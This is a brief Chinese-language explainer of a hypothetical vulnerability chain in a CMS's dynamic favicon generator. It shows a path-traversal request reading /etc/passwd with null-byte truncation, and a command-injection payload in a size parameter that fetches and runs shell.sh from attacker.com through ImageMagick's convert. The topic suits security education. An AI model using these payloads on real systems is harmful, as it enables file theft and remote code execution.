动态生成 Favicon 的参数注入 + 路径遍历
假设场景
某流行 CMS（如 WordPress 插件或自定义框架）提供动态生成 favicon.ico 的功能，允许用户通过参数自定义图标（如颜色、文字），但未对输入参数进行严格过滤。
漏洞利用链
参数注入导致路径遍历
请求示例：
GET /favicon.ico?color=red&text=../../../../etc/passwd%00
若后端拼接参数时直接构造文件路径（如从 /static/icons/<text>.png 读取），攻击者可能通过 ../ 跳转目录，结合 %00 截断绕过扩展名限制，读取敏感文件。
动态命令执行
若服务端使用命令行工具生成图标（如 ImageMagick 的 convert），未过滤参数可能导致 命令注入：
http
复制
GET /favicon.ico?size=100x100;curl${IFS}attacker.com/shell.sh|sh;
服务端代码可能拼接如下命令：
convert -size {size} xc:white favicon.ico
注入的 size 参数可触发远程代码执行（RCE）。
